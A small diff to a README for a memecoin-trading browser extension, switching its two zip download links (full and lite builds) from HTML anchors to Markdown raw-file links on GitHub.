@@ -40,8 +40,8 @@ This extension is built for serious memecoin traders on the [Axiom](https://axio
 
 **Download:**
 
-- **<a href="https://github.com/dkenno2000/Axiom-REMASTERED/blob/main/releases/axiom-remastered-v2.1_full.zip">axiom-remastered-v2.1.zip [full]</a>**
-- **<a href="releases/axiom-remastered-v2.1_lite.zip">axiom-remastered-v2.1.zip [lite]</a>**
+- **[axiom-remastered-v2.1.zip [full]](https://github.com/dkenno2000/Axiom-REMASTERED/raw/main/releases/axiom-remastered-v2.1_full.zip)**
+- **[axiom-remastered-v2.1.zip [lite]](https://github.com/dkenno2000/Axiom-REMASTERED/raw/main/releases/axiom-remastered-v2.1_lite.zip)**
 
 **Two builds are available:**
 
